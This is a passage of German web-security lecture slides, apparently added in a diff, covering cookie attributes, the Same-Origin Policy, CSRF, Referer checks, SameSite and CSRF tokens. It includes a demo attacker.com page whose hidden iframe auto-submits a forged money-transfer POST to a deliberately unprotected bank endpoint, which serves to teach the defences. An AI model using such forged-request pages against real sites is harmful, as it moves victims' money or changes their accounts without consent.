+<span id="cb22-5"><a href=""></a></span>
+<span id="cb22-6"><a href=""></a>// wait for document to load... then run</span>
+<span id="cb22-7"><a href=""></a>console.log(iframe.contentDocument.cookie)</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="was-machen-wir-jetzt-mit-dem-cookie-path" class="slide level2 content-slide code-slide">
+<h2>Was machen wir jetzt mit dem Cookie-Path?</h2>
+<p><br></p>
+<h4 id="wie-bekommt-man-den-cookie-path-sicher">Wie bekommt man den Cookie-Path sicher?</h4>
+<ul>
+<li>Gar nicht! Pfad ist nicht sicher</li>
+<li>Same-Origin-Policy
+<ul>
+<li>Seiten der gleichen Herkunft können gegenseitig auf ihre Cookies zugreifen (und viel mehr)</li>
+</ul></li>
+</ul>
+<h4 id="auf-welchen-wert-sollte-man-den-cookie-path-setzen">Auf welchen Wert sollte man den Cookie-Path setzen?</h4>
+<ul>
+<li>Standardmäßig wird der Pfad der Anfrage genommen, z. B. /class/programmierung</li>
+<li>Wenn man akzeptiert, dass Path nicht sicher ist, kann man auch auf / setzen, um nicht in Versuchung zu kommen, dies als Security-Attribut zu nutzen.</li>
+</ul>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb23"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb23-1"><a href=""></a>Set-Cookie: key=value; Secure; HttpOnly; Path=/</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="domain-attribut-bietet-auch-keine-ausreichende-sicherheit" class="slide level2 content-slide pdf-slide">
+<h2>Domain Attribut bietet auch keine ausreichende Sicherheit</h2>
+<p><br></p>
+<ul>
+<li>Cookies können nur von gleichen oder spezifischeren Domains erreicht werden</li>
+<li><code>informatik.htw-dresden.de vs etechnik.htw-dresden.de</code><br>
+Schließen sich gegenseitig aus</li>
+<li><code>informatik.htw-dresden.de vs htw-dresden.de</code><br>
+Erstere Domain kann auf Cookies der zweiten lesend und schreibend zugreifen</li>
+<li><code>informatik.htw-dresden.de vs login.htw-dresden.de</code><br>
+Schließen sich gegenseitig aus</li>
+</ul>
+</section>
+<section id="cookies-gehorchen-der-same-origin-policy-nicht" class="slide level2 content-slide pdf-slide">
+<h2>Cookies gehorchen der Same-Origin-Policy nicht</h2>
+<p><br></p>
+<ul>
+<li>Cookies wurden vor der Same-Origin-Policy entwickelt und haben ein anderes Sicherheitsmodell</li>
+<li>Cookies sind restriktiver als die Same-Origin-Policy:
+<ul>
+<li>Path partitioniert Cookies nach dem Pfad, ist aber ineffektiv, weil Seiten der gleichen Herkunft auf das Document Object Model gegenseitig zugreifen und Code ausführen können</li>
+</ul></li>
+<li>Cookies sind weniger restriktiv als die Same-Origin-Policy:
+<ul>
+<li>Seiten mit dem gleichen Hostnamen teilen sich Cookies. Protokoll und Port werden ignoriert.</li>
+<li>Unterschiedliche Herkünfte können gegenseitig auf ihre Cookies einwirken.<br>
+<code>informatik.htw-dresden.de</code> kann Cookies für htw-dresden.de setzen.</li>
+<li>Grund, warum Logins oft unter einer anderen Sub-Domain stattfinden.</li>
+</ul></li>
+</ul>
+</section>
+<section id="probleme-bei-ambient-authority" class="slide level2 content-slide code-slide">
+<h2>Probleme bei Ambient Authority</h2>
+<p><br></p>
+<ul>
+<li>Erinnerung: Ambient Authority ist durch Cookies implementiert</li>
+<li>Stellen wir uns folgendes in attacker.com integrierte HTML vor:</li>
+</ul>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb24"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb24-1"><a href=""></a><span class="dt">&lt;</span><span class="kw">h1</span><span class="dt">&gt;</span>Welcome to your account!<span class="dt">&lt;/</span><span class="kw">h1</span><span class="dt">&gt;</span></span>
+<span id="cb24-2"><a href=""></a><span class="dt">&lt;</span><span class="kw">img</span><span class="ot"> src</span><span class="op">=</span><span class="st">'https://bank.com/avatar.png'</span><span class="ot"> </span><span class="dt">/&gt;</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<ul>
+<li>Der Browser sendet die bank.com-Cookies bei allen Anfragen an bank.com mit, obwohl die Anfrage von <code>attacker.com</code> ausgelöst wurde</li>
+<li><code>attacker.com</code> kann den Nutzeravatar von bank.com laden und einbinden</li>
+</ul>
+</section>
+<section id="probleme-bei-ambient-authority-ii" class="slide level2 content-slide code-slide">
+<h2>Probleme bei Ambient Authority II</h2>
+<p><br></p>
+<ul>
+<li>Unklar, welche Seite die Anfrage initiiert hat B- eispiel-HTML integriert in attacker.com:</li>
+</ul>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb25"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb25-1"><a href=""></a><span class="dt">&lt;</span><span class="kw">img</span></span>
+<span id="cb25-2"><a href=""></a><span class="ot">     src</span><span class="op">=</span><span class="st">'https://bank.com/withdraw?fr=bob</span><span class="dv">&amp;amp;</span><span class="st">to=mallory</span><span class="dv">&amp;amp;</span><span class="st">amount=1000'</span><span class="er">&amp;</span><span class="ot">gt</span><span class="er">;</span><span class="dt">&gt;</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<ul>
+<li>Der Browser sendet die bank.com-Cookies bei allen Anfragen an bank.com mit, obwohl die Anfrage von attacker.com ausgelöst wurde</li>
+<li><code>attacker.com</code> kann Aktionen auf bank.com ausführen, indem die eingeloggte Sitzung des Opfers genutzt wird</li>
+</ul>
+</section>
+<section id="cross-site-request-forgery-csrf" class="slide level2 content-slide pdf-slide">
+<h2>Cross-Site Request Forgery (CSRF)</h2>
+<p><br></p>
+<ul>
+<li>Angriffsart, die Endnutzer dazu bringt, ungewünschte Aktionen in einer Webanwendung auszuführen, in der sie gerade authentifiziert sind</li>
+<li>Normale Nutzer: CSRF-Attacken können Nutzer dazu bringen, Geld zu überweisen, Mail-Adressen oder Passwörter zu ändern, etc.</li>
+<li>Administratoren: CSRF-Attacken können Admins dazu bringen, Nutzer zu löschen, Rechte zu ändern, oder andere administrative Aktionen auszuführen</li>
+<li>Angriffe sind wirksam, auch wenn der Angreifer die HTTP-Antwort nicht lesen kann</li>
+</ul>
+</section>
+<section id="csrf-demo" class="slide level2 content-slide code-slide">
+<h2>CSRF-Demo</h2>
+<h3 id="server-javascript-i">Server-JavaScript I</h3>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb26"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb26-1"><a href=""></a> 1     const BALANCES = { alice: 500, bob: 100 }</span>
+<span id="cb26-2"><a href=""></a> 2     app.get('/', (req, res) =&gt; {</span>
+<span id="cb26-3"><a href=""></a> 3         const { sessionId } = req.cookies</span>
+<span id="cb26-4"><a href=""></a> 4         const username = SESSIONS[sessionId]</span>
+<span id="cb26-5"><a href=""></a> 5         if (username) {</span>
+<span id="cb26-6"><a href=""></a> 6             res.send(`</span>
+<span id="cb26-7"><a href=""></a> 7                 <span class="dt">&lt;</span><span class="kw">h1</span><span class="dt">&gt;</span>Welcome, ${username}<span class="dt">&lt;/</span><span class="kw">h1</span><span class="dt">&gt;</span></span>
+<span id="cb26-8"><a href=""></a> 8                 <span class="dt">&lt;</span><span class="kw">p</span><span class="dt">&gt;</span>Your balance is $${BALANCES[username]}<span class="dt">&lt;/</span><span class="kw">p</span><span class="dt">&gt;</span></span>
+<span id="cb26-9"><a href=""></a> 9                 <span class="dt">&lt;</span><span class="kw">p</span><span class="dt">&gt;&lt;</span><span class="kw">a</span><span class="ot"> href</span><span class="op">=</span><span class="st">'/logout'</span><span class="dt">&gt;</span>Logout<span class="dt">&lt;/</span><span class="kw">a</span><span class="dt">&gt;&lt;/</span><span class="kw">p</span><span class="dt">&gt;</span></span>
+<span id="cb26-10"><a href=""></a>10                 <span class="dt">&lt;</span><span class="kw">form</span><span class="ot"> method</span><span class="op">=</span><span class="st">'POST'</span><span class="ot"> action</span><span class="op">=</span><span class="st">'/transfer'</span><span class="dt">&gt;</span></span>
+<span id="cb26-11"><a href=""></a>11                     Send amount:<span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> name</span><span class="op">=</span><span class="st">'amount'</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
+<span id="cb26-12"><a href=""></a>12                     To user:<span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> name</span><span class="op">=</span><span class="st">'to'</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
+<span id="cb26-13"><a href=""></a>13                     <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">'submit'</span><span class="ot"> value</span><span class="op">=</span><span class="st">'Send'</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
+<span id="cb26-14"><a href=""></a>14                 <span class="dt">&lt;/</span><span class="kw">form</span><span class="dt">&gt;</span>`)</span>
+<span id="cb26-15"><a href=""></a>15         } else { createReadStream('index.html').pipe(res) }</span>
+<span id="cb26-16"><a href=""></a>16     })</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="csrf-demo-1" class="slide level2 content-slide code-slide">
+<h2>CSRF-Demo</h2>
+<h3 id="server-javascript-ii">Server-JavaScript II</h3>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb27"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb27-1"><a href=""></a>18     app.post('/transfer', (req, res) =&gt; {</span>
+<span id="cb27-2"><a href=""></a>19         const { sessionId } = req.cookies</span>
+<span id="cb27-3"><a href=""></a>20         const username = SESSIONS[sessionId]</span>
+<span id="cb27-4"><a href=""></a>21</span>
+<span id="cb27-5"><a href=""></a>22            if (!username) {</span>
+<span id="cb27-6"><a href=""></a>23                res.send('Only logged in users can transfer money')</span>
+<span id="cb27-7"><a href=""></a>24                return</span>
+<span id="cb27-8"><a href=""></a>25            }</span>
+<span id="cb27-9"><a href=""></a>26</span>
+<span id="cb27-10"><a href=""></a>27            const amount = Number(req.body.amount)</span>
+<span id="cb27-11"><a href=""></a>28            const to = req.body.to</span>
+<span id="cb27-12"><a href=""></a>29            BALANCES[username] -= amount</span>
+<span id="cb27-13"><a href=""></a>30            BALANCES[to] += amount</span>
+<span id="cb27-14"><a href=""></a>31</span>
+<span id="cb27-15"><a href=""></a>32            res.redirect('/')</span>
+<span id="cb27-16"><a href=""></a>33     })</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="csrf-demo-2" class="slide level2 content-slide code-slide">
+<h2>CSRF-Demo</h2>
+<h3 id="server-html">Server-HTML</h3>
+<p><br></p>
+<h4 id="attacker.com9999">attacker.com:9999</h4>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb28"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb28-1"><a href=""></a>      <span class="dt">&lt;</span><span class="kw">h1</span><span class="dt">&gt;</span>Cool cat site<span class="dt">&lt;/</span><span class="kw">h1</span><span class="dt">&gt;</span></span>
+<span id="cb28-2"><a href=""></a>      <span class="dt">&lt;</span><span class="kw">img</span><span class="ot"> src</span><span class="op">=</span><span class="st">'cat.gif'</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
+<span id="cb28-3"><a href=""></a>      <span class="dt">&lt;</span><span class="kw">iframe</span><span class="ot"> src</span><span class="op">=</span><span class="st">'attacker-frame.html'</span><span class="ot"> style</span><span class="op">=</span><span class="st">'display: none'</span><span class="dt">&gt;&lt;/</span><span class="kw">iframe</span><span class="dt">&gt;</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<h4 id="attacker.com9999attacker-frame.html">attacker.com:9999/attacker-frame.html</h4>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb29"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb29-1"><a href=""></a>      <span class="dt">&lt;</span><span class="kw">form</span><span class="ot"> method</span><span class="op">=</span><span class="st">'POST'</span><span class="ot"> action</span><span class="op">=</span><span class="st">'http://bank.com:8000/transfer'</span><span class="dt">&gt;</span></span>
+<span id="cb29-2"><a href=""></a>          <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> name</span><span class="op">=</span><span class="st">'amount'</span><span class="ot"> value</span><span class="op">=</span><span class="st">'100'</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
+<span id="cb29-3"><a href=""></a>          <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> name</span><span class="op">=</span><span class="st">'to'</span><span class="ot"> value</span><span class="op">=</span><span class="st">'alice'</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
+<span id="cb29-4"><a href=""></a>          <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">'submit'</span><span class="ot"> value</span><span class="op">=</span><span class="st">'Send'</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
+<span id="cb29-5"><a href=""></a>      <span class="dt">&lt;/</span><span class="kw">form</span><span class="dt">&gt;</span></span>
+<span id="cb29-6"><a href=""></a>      <span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb29-7"><a href=""></a>          <span class="bu">document</span><span class="op">.</span><span class="at">forms</span>[<span class="dv">0</span>]<span class="op">.</span><span class="fu">submit</span>()</span>
+<span id="cb29-8"><a href=""></a>     <span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="was-tun-gegen-csrf" class="slide level2 content-slide pdf-slide">
+<h2>Was tun gegen CSRF?</h2>
+<p><br></p>
+<div title="Idee">
+<div class="callout callout-tip callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Idee</strong></p>
+</div>
+<div class="callout-content">
+<p>Können wir „Ambient Authority“ blockieren, wenn die Anfrage von einer anderen Seite kommt?</p>
+</div>
+</div>
+</div>
+</div>
+<div title="Referer Header">
+<div class="callout callout-note callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Referer Header</strong></p>
+</div>
+<div class="callout-content">
+<ul>
+<li>Betrachte den Referer HTTP Header</li>
+<li>Alle Requests ablehnen, die nicht auf einer Whitelist sind</li>
+<li>Vorsicht: Caches</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+</section>
+<section id="referer-header-im-einsatz" class="slide level2 content-slide code-slide">
+<h2>Referer-Header im Einsatz</h2>
+</section>
+<section id="referer-header-im-einsatz-1" class="slide level2 content-slide">
+<h2>Referer-Header im Einsatz</h2>
+<div class="columns">
+<div class="column" style="width:62%;">
+<div class="cell" data-reveal="true" data-layout-align="default">
+<div class="cell-output-display">
+<div>
+<p></p><figure class=""><p></p>
+<div>
+<pre class="mermaid mermaid-js">sequenceDiagram
+    participant C as Client (bank.com)
+    participant S as Server (bank.com)
+    participant H as HTTP-Cache
+    participant A as Client (attacker.com)
+
+    C-&gt;&gt;S: POST /login HTTP/1.1&lt;br&gt;username=alice&amp;password=password
+    Note right of S: Login valid? OK!
+    S-&gt;&gt;C: HTTP/1.1 200 OK&lt;br&gt;Set-Cookie: sessionId=1234
+
+    C-&gt;&gt;S: GET /avatar.png HTTP/1.1&lt;br&gt;Cookie: sessionId=1234&lt;br&gt;Referer: https://bank.com
+    Note right of S: Session valid? OK!
+    Note right of S: Referer allowed? OK!
+    S-&gt;&gt;C: HTTP/1.1 200 OK&lt;br&gt;Cache-Control: public, max-age=31536000
+
+    A-&gt;&gt;H: GET /avatar.png HTTP/1.1&lt;br&gt;Cookie: sessionId=1234&lt;br&gt;Referer: https://bank.com
+    H-&gt;&gt;A: HTTP/1.1 200 OK
+</pre>
+</div>
+<p></p></figure><p></p>
+</div>
+</div>
+</div>
+</div><div class="column" style="width:38%;">
+<div class="fragment">
+<p><strong>1. Login</strong><br>
+Der Client meldet sich bei <code>bank.com</code> an und bekommt die <code>sessionId=1234</code>.</p>
+</div>
+<div class="fragment">
+<p><strong>2. Geschützter Request</strong><br>
+Der Client fordert <code>avatar.png</code> an – mit Cookie <strong>und</strong> <code>Referer: bank.com</code>.</p>
+</div>
+<div class="fragment">
+<p><strong>3. Doppelte Prüfung</strong><br>
+Der Server prüft die Session <strong>und</strong> den Referer. Nur wenn beides stimmt, antwortet er.</p>
+</div>
+<div class="fragment">
+<p><strong>4. Cache-Falle</strong><br>
+Die Antwort ist <code>public</code> cachebar. Der Cache kann sie später an andere ausliefern – der Referer-Schutz greift dann nicht mehr.</p>
+</div>
+</div></div>
+</section>
+<section id="referer-header-kann-csrf-nicht-mitigieren" class="slide level2 content-slide pdf-slide">
+<h2>Referer-Header kann CSRF nicht mitigieren</h2>
+<p><br></p>
+<div title="Vorsicht">
+<div class="callout callout-important callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Vorsicht</strong></p>
+</div>
+<div class="callout-content">
+<p>HTTP-Caches sind ein Problem<br>
+- Varianz hinzufügen: Referer-Header variieren - Oder Cache-Control Header setzen</p>
+<p><code>Cache-Control: no-store</code></p>
+</div>
+</div>
+</div>
+</div>
+<div title="Vorsicht">
+<div class="callout callout-important callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Vorsicht</strong></p>
+</div>
+<div class="callout-content">
+<p>Seiten können darauf verzichten, den Referer-Header zu senden</p>
+</div>
+</div>
+</div>
+</div>
+<div title="Vorsicht">
+<div class="callout callout-important callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Vorsicht</strong></p>
+</div>
+<div class="callout-content">
+<p>Browser-Erweiterungen können den Referer-Header bewusst auslassen (Datenschutz)</p>
+</div>
+</div>
+</div>
+</div>
+</section>
+<section id="samesite-cookies" class="slide level2 content-slide code-slide">
+<h2>SameSite-Cookies</h2>
+<p><br></p>
+<ul>
+<li>SameSite-Cookie-Attribut verhindert, dass Cookies bei Requests von anderen Seiten mitgesendet werden</li>
+<li>Drei Werte:
+<ul>
+<li>SameSite=None: Cookie wird immer gesendet</li>
+<li>SameSite=Lax: Cookies werden bei eingebetteten Anfragen von anderen Domains nicht gesendet; bei Top-Level-Navigation per GET können sie gesendet werden</li>
+<li>SameSite=Strict: Cookie wird nur bei Requests an die gleiche Domain gesendet</li>
+</ul></li>
+</ul>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb30"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb30-1"><a href=""></a>   Set-Cookie: key=value; Secure; HttpOnly; Path=/; SameSite=Lax</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<ul>
+<li>IETF-Standardisierungsvorschlag: SameSite=Lax als Standardwert [1]</li>
+</ul>
+</section>
+<section id="samesite-cookies-in-aktion" class="slide level2 content-slide code-slide">
+<h2>SameSite-Cookies in Aktion</h2>
+<p><br></p>
+<h4 id="server-antwort-von-bank.com">Server Antwort von bank.com:</h4>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb31"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb31-1"><a href=""></a>HTTP/1.1 200 OK</span>
+<span id="cb31-2"><a href=""></a>Set-Cookie: sessionID=1234; SameSite=Lax</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<h4 id="top-level-und-unterseiten-requests-von-bank.com">Top-level und Unterseiten-Requests von bank.com:</h4>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb32"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb32-1"><a href=""></a>POST /transfer HTTP/1.1</span>
+<span id="cb32-2"><a href=""></a>Cookie: sessionID=1234</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<h4 id="requests-von-attacker.com">Requests von attacker.com:</h4>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb33"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb33-1"><a href=""></a>extttPOST /transfer HTTP/1.1 (Cookie-Header fehlt)</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="samesite-cookies-in-aktion-1" class="slide level2 content-slide code-slide">
+<h2>SameSite-Cookies in Aktion</h2>
+<p><br></p>
+</section>
+<section id="samesite-cookies-in-aktion-2" class="slide level2 content-slide code-slide">
+<h2>SameSite-Cookies in Aktion</h2>
+<p><br></p>
+</section>
+<section id="samesite-cookies-in-aktion-3" class="slide level2 content-slide code-slide">
+<h2>SameSite-Cookies in Aktion</h2>
+<p><br></p>
+</section>
+<section id="samesite-cookies-in-aktion-4" class="slide level2 content-slide code-slide">
+<h2>SameSite-Cookies in Aktion</h2>
+<p><br></p>
+</section>
+<section id="samesite-cookies-in-aktion-5" class="slide level2 content-slide code-slide">
+<h2>SameSite-Cookies in Aktion</h2>
+<p><br></p>
+</section>
+<section id="samesite-cookies-in-aktion-6" class="slide level2 content-slide code-slide">
+<h2>SameSite-Cookies in Aktion</h2>
+<p><br></p>
+</section>
+<section id="samesite-cookies-in-aktion-7" class="slide level2 content-slide code-slide">
+<h2>SameSite-Cookies in Aktion</h2>
+<p><br></p>
+</section>
+<section id="samesite-cookies-in-aktion-8" class="slide level2 content-slide code-slide">
+<h2>SameSite-Cookies in Aktion</h2>
+<p><br></p>
+</section>
+<section id="samesite-cookies-in-aktion-9" class="slide level2 content-slide code-slide">
+<h2>SameSite-Cookies in Aktion</h2>
+<p><br></p>
+</section>
+<section id="samesite-cookies-in-aktion-10" class="slide level2 content-slide code-slide">
+<h2>SameSite-Cookies in Aktion</h2>
+<p><br></p>
+</section>
+<section id="samesite-cookies-in-aktion-11" class="slide level2 content-slide code-slide">
+<h2>SameSite-Cookies in Aktion</h2>
+<p><br></p>
+</section>
+<section id="samesite-cookies-in-aktion-12" class="slide level2 content-slide code-slide">
+<h2>SameSite-Cookies in Aktion</h2>
+<p><br></p>
+</section>
+<section id="samesite-cookies-in-aktion-13" class="slide level2 content-slide code-slide">
+<h2>SameSite-Cookies in Aktion</h2>
+<p><br></p>
+</section>
+<section id="samesite-cookies-in-aktion-14" class="slide level2 content-slide code-slide">
+<h2>SameSite-Cookies in Aktion</h2>
+<p><br></p>
+</section>
+<section id="samesite-cookies-in-aktion-15" class="slide level2 content-slide code-slide">
+<h2>SameSite-Cookies in Aktion</h2>
+<p><br></p>
+</section>
+<section id="csrf-verteidigung-token" class="slide level2 content-slide code-slide">
+<h2>CSRF-Verteidigung: Token</h2>
+<p><br></p>
+<ul>
+<li>Primäre Abwehr: serverseitige CSRF-Tokens (Synchronizer Token)</li>
+<li>Token pro Session/Request generieren, im Formular als Hidden-Field mitsenden</li>
+<li>Server verifiziert Token und lehnt Anfragen ohne gültiges Token ab</li>
+</ul>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb34"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb34-1"><a href=""></a><span class="dt">&lt;</span><span class="kw">form</span><span class="ot"> method</span><span class="op">=</span><span class="st">"POST"</span><span class="ot"> action</span><span class="op">=</span><span class="st">"/transfer"</span><span class="dt">&gt;</span></span>
+<span id="cb34-2"><a href=""></a>  <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">"hidden"</span><span class="ot"> name</span><span class="op">=</span><span class="st">"csrf_token"</span><span class="ot"> value</span><span class="op">=</span><span class="st">"{{ csrf_token }}"</span><span class="dt">&gt;</span></span>
+<span id="cb34-3"><a href=""></a>  <span class="co">&lt;!-- weitere Felder --&gt;</span></span>
+<span id="cb34-4"><a href=""></a>  <span class="dt">&lt;</span><span class="kw">button</span><span class="ot"> type</span><span class="op">=</span><span class="st">"submit"</span><span class="dt">&gt;</span>Überweisen<span class="dt">&lt;/</span><span class="kw">button</span><span class="dt">&gt;</span></span>
+<span id="cb34-5"><a href=""></a><span class="dt">&lt;/</span><span class="kw">form</span><span class="dt">&gt;</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb35"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb35-1"><a href=""></a>// Beispiel: Double-Submit Cookie Variante</span>
+<span id="cb35-2"><a href=""></a>// Server setzt: Set-Cookie: csrf={{ token }}; SameSite=Lax; Secure; HttpOn</span>
+<span id="cb35-3"><a href=""></a>// Client sendet Token zusätzlich im Body/Header</span>
+<span id="cb35-4"><a href=""></a>fetch('/transfer', {</span>
+<span id="cb35-5"><a href=""></a>  method: 'POST',</span>
+<span id="cb35-6"><a href=""></a>  headers: { 'X-CSRF-Token': getCookie('csrf') },</span>
+<span id="cb35-7"><a href=""></a>  body: new URLSearchParams({ amount: '100' })</span>
+<span id="cb35-8"><a href=""></a>})</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="wie-lange-sollten-cookies-gelten" class="slide level2 content-slide code-slide">
+<h2>Wie lange sollten Cookies gelten?</h2>
+<p><br></p>
+<ul>
+<li>Wenn <code>Expires</code> oder <code>Max-Age</code> nicht gesetzt sind, wird Cookie gelöscht, wenn Browser geschlossen wird</li>
+<li>Empfehlung: Sinnvolle Lebensdauer für Cookies festlegen – in der Regel 30–90 Tage
+<ul>
+<li>Man kann existierende Cookies immer wieder überschreiben, um den Ablauf zurückzusetzen</li>
+<li>2007: The Google Blog announced that Google will be shortening the expiration date of its cookies from the year 2038 to a two-year life cycle.</li>
+</ul></li>
+</ul>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb36"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb36-1"><a href=""></a>  Set-Cookie: key=value; Secure; HttpOnly; Path=/; SameSite=Lax;</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb37"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb37-1"><a href=""></a>Expires=Sun, 1 Aug 2027 00:00:00 GMT</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="framework-funktionen-nutzen" class="slide level2 content-slide code-slide">
+<h2>Framework-Funktionen nutzen</h2>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb38"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb38-1"><a href=""></a> 1     res.cookie('sessionId', sessionId, {</span>
+<span id="cb38-2"><a href=""></a> 2         secure: true,</span>
+<span id="cb38-3"><a href=""></a> 3         httpOnly: true,</span>
+<span id="cb38-4"><a href=""></a> 4         sameSite: 'lax',</span>
+<span id="cb38-5"><a href=""></a> 5         maxAge: 30 * 24 * 60 * 60 * 1000 // 30 days</span>
+<span id="cb38-6"><a href=""></a> 6     })</span>
+<span id="cb38-7"><a href=""></a> 7</span>
+<span id="cb38-8"><a href=""></a> 8     res.clearCookie('sessionId', {</span>
+<span id="cb38-9"><a href=""></a> 9         secure: true,</span>
+<span id="cb38-10"><a href=""></a>10         httpOnly: true,</span>
+<span id="cb38-11"><a href=""></a>11         sameSite: 'lax'</span>
+<span id="cb38-12"><a href=""></a>12     })</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="zusammenfassung-cookie--und-session-security" class="slide level2 content-slide pdf-slide">
+<h2>Zusammenfassung: Cookie- und Session-Security</h2>
+<p><br></p>
+<h4 id="cookie-attribute">Cookie-Attribute</h4>
+<ul>
+<li>Secure: Nur über HTTPS senden</li>
+<li>HttpOnly: Kein JavaScript-Zugriff (XSS-Schutz)</li>
+<li>SameSite=Lax: CSRF-Schutz als Default</li>
+<li>Path=/: Nicht für Security nutzen</li>
+</ul>
+<h4 id="session-management">Session-Management</h4>
+<ul>
+<li>Session-ID nach Login rotieren</li>
+<li>Serverseitige Invalidierung bei Logout/Timeout</li>
+<li>Kurze Gültigkeit, keine sensiblen Daten im Cookie</li>
+</ul>
+<h4 id="csrf-schutz">CSRF-Schutz</h4>
+<ul>
+<li>CSRF-Tokens für zustandsändernde Aktionen</li>
+<li>Kritische Aktionen nur per POST/PUT</li>
+</ul>
+</section>
+<section id="vernünftiger-cookie-default" class="slide level2 content-slide code-slide">
+<h2>Vernünftiger Cookie-Default</h2>
+<p><br></p>
+<div title="Goldene Regel">
+<div class="callout callout-important callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Goldene Regel</strong></p>
+</div>
+<div class="callout-content">
+<p>Niemals Daten vom Client vertrauen!</p>
+</div>
+</div>
+</div>
+</div>
+<p><br></p>
+<p><strong>Empfohlene Attribute</strong> (Expires dynamisch setzen):</p>
